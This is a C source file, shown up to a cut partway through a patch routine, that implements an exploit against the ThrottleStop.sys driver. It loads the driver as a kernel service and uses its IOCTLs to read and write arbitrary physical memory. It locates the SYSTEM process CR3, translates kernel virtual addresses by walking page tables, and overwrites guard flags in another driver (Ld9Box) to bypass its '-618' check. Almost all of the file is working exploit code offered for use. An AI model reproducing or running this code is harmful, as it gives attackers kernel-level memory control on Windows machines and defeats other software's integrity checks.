/**
 * @file throttlestop.c
 * @brief ThrottleStop.sys physical memory exploit implementation (C port)
 */

#include "throttlestop.h"
#include "nt_defs.h"
#include <stdio.h>
#include <string.h>

//=============================================================================
// Forward Declarations
//=============================================================================

static void TS_SetError(PTS_CTX ctx, const char* format, ...);
static void TS_CleanupArtifacts(PTS_CTX ctx);

//=============================================================================
// Initialization / Cleanup
//=============================================================================

void TS_Init(PTS_CTX ctx) {
    if (!ctx) return;

    memset(ctx, 0, sizeof(TS_CTX));
    ctx->hDevice = INVALID_HANDLE_VALUE;
    ctx->hSCManager = NULL;
    ctx->hService = NULL;
    ctx->bInitialized = false;
    ctx->bDriverDeployed = false;
    ctx->SystemCr3 = 0;
    ctx->EtwSavedValue = 0;
}

void TS_Cleanup(PTS_CTX ctx) {
    if (!ctx) return;

    DbgLog("TS_Cleanup: Starting...");

    // Close device handle
    if (ctx->hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(ctx->hDevice);
        ctx->hDevice = INVALID_HANDLE_VALUE;
    }

    // Stop and delete service
    if (ctx->bDriverDeployed) {
        TS_StopService(ctx);
        TS_DeleteService(ctx);
        ctx->bDriverDeployed = false;
    }

    // Clean up artifacts
    TS_CleanupArtifacts(ctx);

    ctx->bInitialized = false;
    ctx->SystemCr3 = 0;

    DbgLog("TS_Cleanup: Complete");
}

bool TS_Initialize(PTS_CTX ctx, const wchar_t* wszDriverPath) {
    if (!ctx) return false;

    DbgLog("TS_Initialize: ============================================");
    DbgLog("TS_Initialize: Starting...");
    DbgLog("TS_Initialize: ============================================");

    if (ctx->bInitialized) {
        DbgLog("TS_Initialize: Already initialized");
        return true;
    }

    // If no path provided, try to open existing device
    if (!wszDriverPath || wszDriverPath[0] == L'\0') {
        DbgLog("TS_Initialize: No driver path, checking for existing device...");
        if (TS_OpenDevice(ctx)) {
            ctx->bInitialized = true;
            DbgLog("TS_Initialize: Using existing driver - device opened");
            return true;
        }
        TS_SetError(ctx, "No driver path provided and driver not loaded");
        return false;
    }

    DbgLog("TS_Initialize: Driver path: %ls", wszDriverPath);

    // Store path
    wcsncpy_s(ctx->wszDriverPath, sizeof(ctx->wszDriverPath)/sizeof(wchar_t),
              wszDriverPath, _TRUNCATE);

    // Create and start service
    DbgLog("TS_Initialize: Creating driver service...");
    if (!TS_CreateService(ctx, wszDriverPath)) {
        DbgLog("TS_Initialize: Failed to create service");
        return false;
    }

    DbgLog("TS_Initialize: Starting driver service...");
    if (!TS_StartService(ctx)) {
        DbgLog("TS_Initialize: Failed to start service");
        TS_DeleteService(ctx);
        return false;
    }

    // Give driver time to initialize
    DbgLog("TS_Initialize: Waiting 100ms for driver initialization...");
    Sleep(100);

    // Open device
    DbgLog("TS_Initialize: Opening device...");
    if (!TS_OpenDevice(ctx)) {
        DbgLog("TS_Initialize: Failed to open device");
        TS_StopService(ctx);
        TS_DeleteService(ctx);
        return false;
    }

    // Mark initialized BEFORE calling GetSystemCr3
    ctx->bInitialized = true;

    // Cache system CR3
    DbgLog("TS_Initialize: Getting SYSTEM CR3...");
    ctx->SystemCr3 = TS_GetSystemCr3(ctx);
    if (ctx->SystemCr3 == 0) {
        DbgLog("TS_Initialize: WARNING: Could not get SYSTEM CR3");
    } else {
        DbgLog("TS_Initialize: SYSTEM CR3 = 0x%016llX", ctx->SystemCr3);
    }

    DbgLog("TS_Initialize: ============================================");
    DbgLog("TS_Initialize: COMPLETE");
    DbgLog("TS_Initialize: ============================================");
    return true;
}

bool TS_IsInitialized(PTS_CTX ctx) {
    return ctx && ctx->bInitialized;
}

const char* TS_GetLastError(PTS_CTX ctx) {
    if (!ctx) return "NULL context";
    return ctx->szLastError;
}

//=============================================================================
// Error Handling
//=============================================================================

static void TS_SetError(PTS_CTX ctx, const char* format, ...) {
    if (!ctx) return;

    va_list args;
    va_start(args, format);
    vsnprintf(ctx->szLastError, sizeof(ctx->szLastError), format, args);
    va_end(args);

    DbgLog("[ThrottleStop] ERROR: %s", ctx->szLastError);
}

//=============================================================================
// Service Management
//=============================================================================

bool TS_CreateService(PTS_CTX ctx, const wchar_t* wszDriverPath) {
    if (!ctx) return false;

    ctx->hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!ctx->hSCManager) {
        TS_SetError(ctx, "OpenSCManager failed: %lu", GetLastError());
        return false;
    }

    // Generate unique service name
    swprintf_s(ctx->wszServiceName, sizeof(ctx->wszServiceName)/sizeof(wchar_t),
               L"ThrottleStop_Ombra_%llu", GetTickCount64());

    ctx->hService = CreateServiceW(
        ctx->hSCManager,
        ctx->wszServiceName,
        ctx->wszServiceName,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        wszDriverPath,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if (!ctx->hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            ctx->hService = OpenServiceW(ctx->hSCManager, ctx->wszServiceName,
                                          SERVICE_ALL_ACCESS);
            if (!ctx->hService) {
                TS_SetError(ctx, "Service exists but OpenService failed: %lu",
                            GetLastError());
                return false;
            }
        } else {
            TS_SetError(ctx, "CreateService failed: %lu", err);
            return false;
        }
    }

    DbgLog("TS_CreateService: Created service '%ls'", ctx->wszServiceName);
    return true;
}

bool TS_StartService(PTS_CTX ctx) {
    if (!ctx || !ctx->hService) {
        TS_SetError(ctx, "No service handle");
        return false;
    }

    if (!StartServiceW(ctx->hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            DbgLog("TS_StartService: Service already running");
            return true;
        }
        TS_SetError(ctx, "StartService failed: %lu", err);
        return false;
    }

    DbgLog("TS_StartService: Service started");
    ctx->bDriverDeployed = true;
    return true;
}

bool TS_StopService(PTS_CTX ctx) {
    if (!ctx || !ctx->hService) return true;

    SERVICE_STATUS status = {0};
    if (!ControlService(ctx->hService, SERVICE_CONTROL_STOP, &status)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_NOT_ACTIVE) {
            DbgLog("TS_StopService: ControlService failed: %lu", err);
        }
    }

    // Wait for service to stop
    for (int i = 0; i < 10; i++) {
        if (QueryServiceStatus(ctx->hService, &status)) {
            if (status.dwCurrentState == SERVICE_STOPPED) {
                DbgLog("TS_StopService: Service stopped");
                return true;
            }
        }
        Sleep(100);
    }

    return true;
}

bool TS_DeleteService(PTS_CTX ctx) {
    if (!ctx || !ctx->hService) return true;

    if (!DeleteService(ctx->hService)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_MARKED_FOR_DELETE) {
            DbgLog("TS_DeleteService: DeleteService failed: %lu", err);
        }
    }

    CloseServiceHandle(ctx->hService);
    ctx->hService = NULL;

    if (ctx->hSCManager) {
        CloseServiceHandle(ctx->hSCManager);
        ctx->hSCManager = NULL;
    }

    DbgLog("TS_DeleteService: Service deleted");
    return true;
}

bool TS_OpenDevice(PTS_CTX ctx) {
    if (!ctx) return false;

    // Try dynamic device name based on service name
    if (ctx->wszServiceName[0] != L'\0') {
        wchar_t dynamicDevice[128];
        swprintf_s(dynamicDevice, sizeof(dynamicDevice)/sizeof(wchar_t),
                   L"\\\\.\\%ls", ctx->wszServiceName);

        DbgLog("TS_OpenDevice: Trying dynamic device: %ls", dynamicDevice);

        ctx->hDevice = CreateFileW(
            dynamicDevice,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (ctx->hDevice != INVALID_HANDLE_VALUE) {
            DbgLog("TS_OpenDevice: Opened dynamic device: %ls", dynamicDevice);
            return true;
        }

        DbgLog("TS_OpenDevice: Dynamic device failed: %lu", GetLastError());
    }

    // Try static device name
    DbgLog("TS_OpenDevice: Trying static device: %ls", TS_DEVICE_NAME);

    ctx->hDevice = CreateFileW(
        TS_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (ctx->hDevice != INVALID_HANDLE_VALUE) {
        DbgLog("TS_OpenDevice: Opened: %ls", TS_DEVICE_NAME);
        return true;
    }

    // Try alternate device name
    DbgLog("TS_OpenDevice: Trying alternate device: %ls", TS_DEVICE_NAME_ALT);

    ctx->hDevice = CreateFileW(
        TS_DEVICE_NAME_ALT,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (ctx->hDevice != INVALID_HANDLE_VALUE) {
        DbgLog("TS_OpenDevice: Opened: %ls", TS_DEVICE_NAME_ALT);
        return true;
    }

    TS_SetError(ctx, "Failed to open device: %lu", GetLastError());
    return false;
}

//=============================================================================
// Physical Memory Primitives - Granular Operations
//=============================================================================

bool TS_ReadPhys8(PTS_CTX ctx, UINT64 physAddr, UINT64* pValue) {
    if (!ctx || !ctx->bInitialized || ctx->hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    // Ghidra RE shows driver expects:
    // - InputBufferLength = read size (1, 2, 4, or 8)
    // - OutputBufferLength = always 8
    // Driver reads InputBufferLength bytes from physical memory into output buffer

    DWORD dwReturned = 0;
    UINT64 outputBuf = 0;  // Always 8 bytes for output

    BOOL result = DeviceIoControl(
        ctx->hDevice,
        TS_IOCTL_PHYS_READ,
        &physAddr,              // Input: 8-byte physical address
        8,                      // Input size: 8 = read 8 bytes
        &outputBuf,             // Output: 8-byte buffer
        8,                      // Output size: always 8
        &dwReturned,
        NULL
    );

    if (!result) {
        DbgLog("TS_ReadPhys8: FAILED at PA 0x%016llX: error %lu", physAddr, GetLastError());
        return false;
    }

    *pValue = outputBuf;
    return true;
}

bool TS_ReadPhys4(PTS_CTX ctx, UINT64 physAddr, UINT32* pValue) {
    if (!ctx || !ctx->bInitialized || ctx->hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    // Ghidra RE: InputBufferLength = read size, OutputBufferLength = always 8
    DWORD dwReturned = 0;
    UINT64 outputBuf = 0;  // Always 8 bytes for output

    BOOL result = DeviceIoControl(
        ctx->hDevice,
        TS_IOCTL_PHYS_READ,
        &physAddr,
        4,                      // Input size: 4 = read 4 bytes
        &outputBuf,             // Output: 8-byte buffer
        8,                      // Output size: always 8
        &dwReturned,
        NULL
    );

    if (!result) {
        DbgLog("TS_ReadPhys4: FAILED at PA 0x%016llX: error %lu", physAddr, GetLastError());
        return false;
    }

    *pValue = (UINT32)outputBuf;
    return true;
}

bool TS_ReadPhys2(PTS_CTX ctx, UINT64 physAddr, UINT16* pValue) {
    if (!ctx || !ctx->bInitialized || ctx->hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    // Ghidra RE: InputBufferLength = read size, OutputBufferLength = always 8
    DWORD dwReturned = 0;
    UINT64 outputBuf = 0;  // Always 8 bytes for output

    BOOL result = DeviceIoControl(
        ctx->hDevice,
        TS_IOCTL_PHYS_READ,
        &physAddr,
        2,                      // Input size: 2 = read 2 bytes
        &outputBuf,             // Output: 8-byte buffer
        8,                      // Output size: always 8
        &dwReturned,
        NULL
    );

    if (!result) {
        DbgLog("TS_ReadPhys2: FAILED at PA 0x%016llX: error %lu", physAddr, GetLastError());
        return false;
    }

    *pValue = (UINT16)outputBuf;
    return true;
}

bool TS_ReadPhys1(PTS_CTX ctx, UINT64 physAddr, UINT8* pValue) {
    if (!ctx || !ctx->bInitialized || ctx->hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    // Ghidra RE: InputBufferLength = read size, OutputBufferLength = always 8
    DWORD dwReturned = 0;
    UINT64 outputBuf = 0;  // Always 8 bytes for output

    BOOL result = DeviceIoControl(
        ctx->hDevice,
        TS_IOCTL_PHYS_READ,
        &physAddr,
        1,                      // Input size: 1 = read 1 byte
        &outputBuf,             // Output: 8-byte buffer
        8,                      // Output size: always 8
        &dwReturned,
        NULL
    );

    if (!result) {
        DbgLog("TS_ReadPhys1: FAILED at PA 0x%016llX: error %lu", physAddr, GetLastError());
        return false;
    }

    *pValue = (UINT8)outputBuf;
    return true;
}

bool TS_WritePhys8(PTS_CTX ctx, UINT64 physAddr, UINT64 value) {
    if (!ctx || !ctx->bInitialized || ctx->hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    TS_WRITE_REQ_8 req;
    req.PhysicalAddress = physAddr;
    req.Value = value;

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        ctx->hDevice,
        TS_IOCTL_PHYS_WRITE,
        &req,                   // Input: PhysAddr(8) + Value(8) = 16 bytes
        sizeof(req),
        NULL,                   // No output
        0,
        &dwReturned,
        NULL
    );

    if (!result) {
        DbgLog("TS_WritePhys8: FAILED at PA 0x%016llX: error %lu", physAddr, GetLastError());
        return false;
    }

    return true;
}

bool TS_WritePhys4(PTS_CTX ctx, UINT64 physAddr, UINT32 value) {
    if (!ctx || !ctx->bInitialized || ctx->hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    TS_WRITE_REQ_4 req;
    req.PhysicalAddress = physAddr;
    req.Value = value;

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        ctx->hDevice,
        TS_IOCTL_PHYS_WRITE,
        &req,                   // Input: PhysAddr(8) + Value(4) = 12 bytes
        sizeof(req),
        NULL,
        0,
        &dwReturned,
        NULL
    );

    if (!result) {
        DbgLog("TS_WritePhys4: FAILED at PA 0x%016llX: error %lu", physAddr, GetLastError());
        return false;
    }

    return true;
}

bool TS_WritePhys2(PTS_CTX ctx, UINT64 physAddr, UINT16 value) {
    if (!ctx || !ctx->bInitialized || ctx->hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    TS_WRITE_REQ_2 req;
    req.PhysicalAddress = physAddr;
    req.Value = value;

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        ctx->hDevice,
        TS_IOCTL_PHYS_WRITE,
        &req,                   // Input: PhysAddr(8) + Value(2) = 10 bytes
        sizeof(req),
        NULL,
        0,
        &dwReturned,
        NULL
    );

    if (!result) {
        DbgLog("TS_WritePhys2: FAILED at PA 0x%016llX: error %lu", physAddr, GetLastError());
        return false;
    }

    return true;
}

bool TS_WritePhys1(PTS_CTX ctx, UINT64 physAddr, UINT8 value) {
    if (!ctx || !ctx->bInitialized || ctx->hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    TS_WRITE_REQ_1 req;
    req.PhysicalAddress = physAddr;
    req.Value = value;

    DWORD dwReturned = 0;
    BOOL result = DeviceIoControl(
        ctx->hDevice,
        TS_IOCTL_PHYS_WRITE,
        &req,                   // Input: PhysAddr(8) + Value(1) = 9 bytes
        sizeof(req),
        NULL,
        0,
        &dwReturned,
        NULL
    );

    if (!result) {
        DbgLog("TS_WritePhys1: FAILED at PA 0x%016llX: error %lu", physAddr, GetLastError());
        return false;
    }

    return true;
}

//=============================================================================
// Physical Memory Primitives - Aggregated Operations
//=============================================================================

bool TS_ReadPhysical(PTS_CTX ctx, UINT64 physAddr, void* pBuffer, UINT32 cbSize) {
    if (!ctx || !ctx->bInitialized) {
        TS_SetError(ctx, "Not initialized");
        return false;
    }

    if (!pBuffer || cbSize == 0) {
        TS_SetError(ctx, "Invalid buffer or size");
        return false;
    }

    UINT8* dst = (UINT8*)pBuffer;
    UINT64 addr = physAddr;
    UINT32 remaining = cbSize;

    // Read in 8-byte chunks
    while (remaining >= 8) {
        UINT64 val;
        if (!TS_ReadPhys8(ctx, addr, &val)) {
            TS_SetError(ctx, "ReadPhys8 failed at PA 0x%016llX", addr);
            return false;
        }
        memcpy(dst, &val, 8);
        dst += 8;
        addr += 8;
        remaining -= 8;
    }

    // Handle remaining bytes
    if (remaining >= 4) {
        UINT32 val;
        if (!TS_ReadPhys4(ctx, addr, &val)) {
            TS_SetError(ctx, "ReadPhys4 failed at PA 0x%016llX", addr);
            return false;
        }
        memcpy(dst, &val, 4);
        dst += 4;
        addr += 4;
        remaining -= 4;
    }

    if (remaining >= 2) {
        UINT16 val;
        if (!TS_ReadPhys2(ctx, addr, &val)) {
            TS_SetError(ctx, "ReadPhys2 failed at PA 0x%016llX", addr);
            return false;
        }
        memcpy(dst, &val, 2);
        dst += 2;
        addr += 2;
        remaining -= 2;
    }

    if (remaining == 1) {
        UINT8 val;
        if (!TS_ReadPhys1(ctx, addr, &val)) {
            TS_SetError(ctx, "ReadPhys1 failed at PA 0x%016llX", addr);
            return false;
        }
        *dst = val;
    }

    return true;
}

bool TS_WritePhysical(PTS_CTX ctx, UINT64 physAddr, const void* pBuffer, UINT32 cbSize) {
    if (!ctx || !ctx->bInitialized) {
        TS_SetError(ctx, "Not initialized");
        return false;
    }

    if (!pBuffer || cbSize == 0) {
        TS_SetError(ctx, "Invalid buffer or size");
        return false;
    }

    const UINT8* src = (const UINT8*)pBuffer;
    UINT64 addr = physAddr;
    UINT32 remaining = cbSize;

    // Write in 8-byte chunks
    while (remaining >= 8) {
        UINT64 val;
        memcpy(&val, src, 8);
        if (!TS_WritePhys8(ctx, addr, val)) {
            TS_SetError(ctx, "WritePhys8 failed at PA 0x%016llX", addr);
            return false;
        }
        src += 8;
        addr += 8;
        remaining -= 8;
    }

    // Handle remaining bytes
    if (remaining >= 4) {
        UINT32 val;
        memcpy(&val, src, 4);
        if (!TS_WritePhys4(ctx, addr, val)) {
            TS_SetError(ctx, "WritePhys4 failed at PA 0x%016llX", addr);
            return false;
        }
        src += 4;
        addr += 4;
        remaining -= 4;
    }

    if (remaining >= 2) {
        UINT16 val;
        memcpy(&val, src, 2);
        if (!TS_WritePhys2(ctx, addr, val)) {
            TS_SetError(ctx, "WritePhys2 failed at PA 0x%016llX", addr);
            return false;
        }
        src += 2;
        addr += 2;
        remaining -= 2;
    }

    if (remaining == 1) {
        if (!TS_WritePhys1(ctx, addr, *src)) {
            TS_SetError(ctx, "WritePhys1 failed at PA 0x%016llX", addr);
            return false;
        }
    }

    return true;
}

//=============================================================================
// Virtual-to-Physical Translation
//=============================================================================

UINT64 TS_GetSystemCr3(PTS_CTX ctx) {
    if (!ctx || !ctx->bInitialized) return 0;

    DbgLog("TS_GetSystemCr3: Scanning physical memory for SYSTEM EPROCESS...");

    // Common physical addresses where SYSTEM EPROCESS is found
    // Expanded range to cover more common locations across different systems
    static const UINT64 commonAddresses[] = {
        // Low range (64KB-128KB) - some systems
        0x10000, 0x11000, 0x12000, 0x13000, 0x14000, 0x15000, 0x16000, 0x17000,
        0x18000, 0x19000, 0x1a000, 0x1b000, 0x1c000, 0x1d000, 0x1e000, 0x1f000,
        0x20000,
        // Mid-low range (1MB-2MB) - common on many systems
        0x100000, 0x110000, 0x120000, 0x130000, 0x140000, 0x150000, 0x160000,
        0x170000, 0x180000, 0x190000, 0x1a0000, 0x1b0000, 0x1c0000, 0x1d0000,
        0x1e0000, 0x1f0000, 0x200000,
        // Original range (1.6MB-1.7MB) - most common observed
        0x1a2000, 0x1a3000, 0x1a4000, 0x1a5000, 0x1a6000, 0x1a7000, 0x1a8000,
        0x1a9000, 0x1aa000, 0x1ab000, 0x1ac000, 0x1ad000, 0x1ae000, 0x1af000,
        0x1b0000, 0x1b1000, 0x1b2000, 0x1b3000, 0x1b4000, 0x1b5000, 0x1b6000,
        0x1b7000, 0x1b8000, 0x1b9000, 0x1ba000, 0x1bb000, 0x1bc000, 0x1bd000,
        0x1be000, 0x1bf000, 0x1c0000,
    };

    // "System" as little-endian bytes
    const UINT64 systemMask = 0x0000FFFFFFFFFFFFULL;  // First 6 bytes
    const UINT64 systemStr  = 0x00006d6574737953ULL;  // "System"

    // Try common addresses first
    for (size_t i = 0; i < sizeof(commonAddresses)/sizeof(commonAddresses[0]); i++) {
        UINT64 baseAddr = commonAddresses[i];
        UINT64 imageFileName = 0;

        // Read ImageFileName at offset 0x5a8
        if (!TS_ReadPhys8(ctx, baseAddr + EPROCESS_IMAGE_FILE_NAME, &imageFileName)) {
            continue;
        }

        if ((imageFileName & systemMask) == systemStr) {
            // Found "System"! Read DirectoryTableBase at offset 0x28
            UINT64 cr3 = 0;
            if (!TS_ReadPhys8(ctx, baseAddr + EPROCESS_DIRECTORY_TABLE_BASE, &cr3)) {
                DbgLog("TS_GetSystemCr3: Found 'System' at 0x%016llX but failed to read CR3",
                       baseAddr);
                continue;
            }

            // Validate CR3 - must be page-aligned and in valid range
            if ((cr3 & 0xFFF) == 0 && cr3 != 0 && cr3 < 0x200000000000ULL) {
                DbgLog("TS_GetSystemCr3: Found SYSTEM CR3: 0x%016llX at phys 0x%016llX",
                       cr3, baseAddr);
                return cr3;
            }
        }
    }

    DbgLog("TS_GetSystemCr3: Not found at common addresses, scanning 64KB-32MB...");

    // Scan first 32MB of physical memory (64KB start to avoid BIOS/firmware regions)
    for (UINT64 baseAddr = 0x10000; baseAddr < 0x2000000; baseAddr += 0x1000) {
        UINT64 imageFileName = 0;
        if (!TS_ReadPhys8(ctx, baseAddr + EPROCESS_IMAGE_FILE_NAME, &imageFileName)) {
            continue;
        }

        if ((imageFileName & systemMask) == systemStr) {
            UINT64 cr3 = 0;
            if (!TS_ReadPhys8(ctx, baseAddr + EPROCESS_DIRECTORY_TABLE_BASE, &cr3)) {
                continue;
            }

            if ((cr3 & 0xFFF) == 0 && cr3 != 0 && cr3 < 0x200000000000ULL) {
                DbgLog("TS_GetSystemCr3: Found SYSTEM CR3: 0x%016llX at phys 0x%016llX",
                       cr3, baseAddr);
                return cr3;
            }
        }
    }

    TS_SetError(ctx, "Could not find SYSTEM process CR3");
    return 0;
}

bool TS_VirtToPhys(PTS_CTX ctx, UINT64 cr3, UINT64 virtualAddr, UINT64* pPhysAddr) {
    if (!ctx || !pPhysAddr) return false;

    DbgLog("TS_VirtToPhys: VA=0x%016llX CR3=0x%016llX", virtualAddr, cr3);

    // Use cached CR3 if none provided
    if (cr3 == 0) {
        if (ctx->SystemCr3 == 0) {
            DbgLog("TS_VirtToPhys: Getting SYSTEM CR3...");
            ctx->SystemCr3 = TS_GetSystemCr3(ctx);
            if (ctx->SystemCr3 == 0) {
                TS_SetError(ctx, "No CR3 available for translation");
                return false;
            }
        }
        cr3 = ctx->SystemCr3;
        DbgLog("TS_VirtToPhys: Using SYSTEM CR3=0x%016llX", cr3);
    }

    // Extract page table indices
    UINT64 pml4Index = (virtualAddr >> PT_PML4E_SHIFT) & 0x1FF;
    UINT64 pdptIndex = (virtualAddr >> PT_PDPTE_SHIFT) & 0x1FF;
    UINT64 pdIndex   = (virtualAddr >> PT_PDE_SHIFT) & 0x1FF;
    UINT64 ptIndex   = (virtualAddr >> PT_PTE_SHIFT) & 0x1FF;
    UINT64 offset    = virtualAddr & PT_OFFSET_MASK;

    DbgLog("TS_VirtToPhys: Indices: PML4=%llu PDPT=%llu PD=%llu PT=%llu offset=0x%llX",
           pml4Index, pdptIndex, pdIndex, ptIndex, offset);

    // Read PML4E
    UINT64 pml4eAddr = (cr3 & PT_PFN_MASK) + (pml4Index * 8);
    UINT64 pml4e = 0;
    if (!TS_ReadPhys8(ctx, pml4eAddr, &pml4e)) {
        TS_SetError(ctx, "Failed to read PML4E at 0x%016llX", pml4eAddr);
        return false;
    }

    DbgLog("TS_VirtToPhys: PML4E @ 0x%016llX = 0x%016llX (Present=%d)",
           pml4eAddr, pml4e, (pml4e & PT_PAGE_PRESENT) ? 1 : 0);

    if (!(pml4e & PT_PAGE_PRESENT)) {
        TS_SetError(ctx, "PML4E not present for VA 0x%016llX", virtualAddr);
        return false;
    }

    // Read PDPTE
    UINT64 pdpteAddr = (pml4e & PT_PFN_MASK) + (pdptIndex * 8);
    UINT64 pdpte = 0;
    if (!TS_ReadPhys8(ctx, pdpteAddr, &pdpte)) {
        TS_SetError(ctx, "Failed to read PDPTE at 0x%016llX", pdpteAddr);
        return false;
    }

    DbgLog("TS_VirtToPhys: PDPTE @ 0x%016llX = 0x%016llX (Present=%d, Large=%d)",
           pdpteAddr, pdpte, (pdpte & PT_PAGE_PRESENT) ? 1 : 0,
           (pdpte & PT_PAGE_LARGE) ? 1 : 0);

    if (!(pdpte & PT_PAGE_PRESENT)) {
        TS_SetError(ctx, "PDPTE not present for VA 0x%016llX", virtualAddr);
        return false;
    }

    // Check for 1GB page
    if (pdpte & PT_PAGE_LARGE) {
        *pPhysAddr = (pdpte & 0x000FFFFFC0000000ULL) | (virtualAddr & 0x3FFFFFFFULL);
        DbgLog("TS_VirtToPhys: 1GB PAGE -> PA=0x%016llX", *pPhysAddr);
        return true;
    }

    // Read PDE
    UINT64 pdeAddr = (pdpte & PT_PFN_MASK) + (pdIndex * 8);
    UINT64 pde = 0;
    if (!TS_ReadPhys8(ctx, pdeAddr, &pde)) {
        TS_SetError(ctx, "Failed to read PDE at 0x%016llX", pdeAddr);
        return false;
    }

    DbgLog("TS_VirtToPhys: PDE @ 0x%016llX = 0x%016llX (Present=%d, Large=%d)",
           pdeAddr, pde, (pde & PT_PAGE_PRESENT) ? 1 : 0,
           (pde & PT_PAGE_LARGE) ? 1 : 0);

    if (!(pde & PT_PAGE_PRESENT)) {
        TS_SetError(ctx, "PDE not present for VA 0x%016llX", virtualAddr);
        return false;
    }

    // Check for 2MB page
    if (pde & PT_PAGE_LARGE) {
        *pPhysAddr = (pde & 0x000FFFFFFFE00000ULL) | (virtualAddr & 0x1FFFFFULL);
        DbgLog("TS_VirtToPhys: 2MB PAGE -> PA=0x%016llX", *pPhysAddr);
        return true;
    }

    // Read PTE
    UINT64 pteAddr = (pde & PT_PFN_MASK) + (ptIndex * 8);
    UINT64 pte = 0;
    if (!TS_ReadPhys8(ctx, pteAddr, &pte)) {
        TS_SetError(ctx, "Failed to read PTE at 0x%016llX", pteAddr);
        return false;
    }

    DbgLog("TS_VirtToPhys: PTE @ 0x%016llX = 0x%016llX (Present=%d)",
           pteAddr, pte, (pte & PT_PAGE_PRESENT) ? 1 : 0);

    if (!(pte & PT_PAGE_PRESENT)) {
        TS_SetError(ctx, "PTE not present for VA 0x%016llX", virtualAddr);
        return false;
    }

    // 4KB page
    *pPhysAddr = (pte & PT_PFN_MASK) | offset;
    DbgLog("TS_VirtToPhys: 4KB PAGE -> PA=0x%016llX", *pPhysAddr);
    return true;
}

//=============================================================================
// -618 Bypass
//=============================================================================

bool TS_Patch618Flags(PTS_CTX ctx, UINT64 ld9BoxBase) {
    if (!ctx || !ctx->bInitialized) return false;

    DbgLog("TS_Patch618Flags: ============================================");
    DbgLog("TS_Patch618Flags: BYPASSING -618 CHECK (GUARD FLAG METHOD)");
    DbgLog("TS_Patch618Flags: ============================================");
    DbgLog("TS_Patch618Flags: Target driver base: 0x%016llX", ld9BoxBase);
    DbgLog("TS_Patch618Flags: ");
    DbgLog("TS_Patch618Flags: Strategy: Patch GUARD flags to skip parsing block");
    DbgLog("TS_Patch618Flags: Guard flags control whether module parsing runs.");
    DbgLog("TS_Patch618Flags: If either guard is non-zero, parsing is skipped");
    DbgLog("TS_Patch618Flags: and -618 error is never generated.");
    DbgLog("TS_Patch618Flags: ");

    // Calculate GUARD flag virtual addresses (NOT result flags!)
    UINT64 ntoskrnlGuardVA = ld9BoxBase + LD9BOX_NTOSKRNL_GUARD_OFFSET;
    UINT64 halGuardVA = ld9BoxBase + LD9BOX_HAL_GUARD_OFFSET;

    DbgLog("TS_Patch618Flags: ntoskrnl GUARD VA: 0x%016llX (base + 0x%llX)",
           ntoskrnlGuardVA, (UINT64)LD9BOX_NTOSKRNL_GUARD_OFFSET);
    DbgLog("TS_Patch618Flags: hal GUARD VA: 0x%016llX (base + 0x%llX)",
           halGuardVA, (UINT64)LD9BOX_HAL_GUARD_OFFSET);

    // Translate VAs to PAs
    DbgLog("TS_Patch618Flags: Translating ntoskrnl GUARD VA to PA...");
    UINT64 ntoskrnlGuardPA = 0;
    UINT64 halGuardPA = 0;

    if (!TS_VirtToPhys(ctx, 0, ntoskrnlGuardVA, &ntoskrnlGuardPA)) {
        TS_SetError(ctx, "Failed to translate ntoskrnl guard VA 0x%016llX", ntoskrnlGuardVA);
        return false;
    }
    DbgLog("TS_Patch618Flags: ntoskrnl GUARD PA: 0x%016llX", ntoskrnlGuardPA);

    DbgLog("TS_Patch618Flags: Translating hal GUARD VA to PA...");
    if (!TS_VirtToPhys(ctx, 0, halGuardVA, &halGuardPA)) {
        TS_SetError(ctx, "Failed to translate hal guard VA 0x%016llX", halGuardVA);
        return false;
    }
    DbgLog("TS_Patch618Flags: hal GUARD PA: 0x%016llX", halGuardPA);

    // Read current guard values for logging
    UINT8 currentNtoskrnlGuard = 0, currentHalGuard = 0;
    DbgLog("TS_Patch618Flags: Reading current GUARD flag values...");
    TS_ReadPhys1(ctx, ntoskrnlGuardPA, &currentNtoskrnlGuard);
    TS_ReadPhys1(ctx, halGuardPA, &currentHalGuard);
    DbgLog("TS_Patch618Flags: BEFORE: ntoskrnl_guard=%u (0x%02X) hal_guard=%u (0x%02X)",
           currentNtoskrnlGuard, currentNtoskrnlGuard, currentHalGuard, currentHalGuard);

    // Write 1 to BOTH guard flags to ensure parsing is skipped
    // (The condition is: if ((guard1 == 0) && (guard2 == 0)) then parse)
    // So setting either to 1 would work, but we set both for safety
    DbgLog("TS_Patch618Flags: Writing 1 to ntoskrnl GUARD flag...");
    if (!TS_WritePhys1(ctx, ntoskrnlGuardPA, 1)) {
        TS_SetError(ctx, "Failed to write ntoskrnl guard flag");
        return false;
    }

    DbgLog("TS_Patch618Flags: Writing 1 to hal GUARD flag...");
    if (!TS_WritePhys1(ctx, halGuardPA, 1)) {
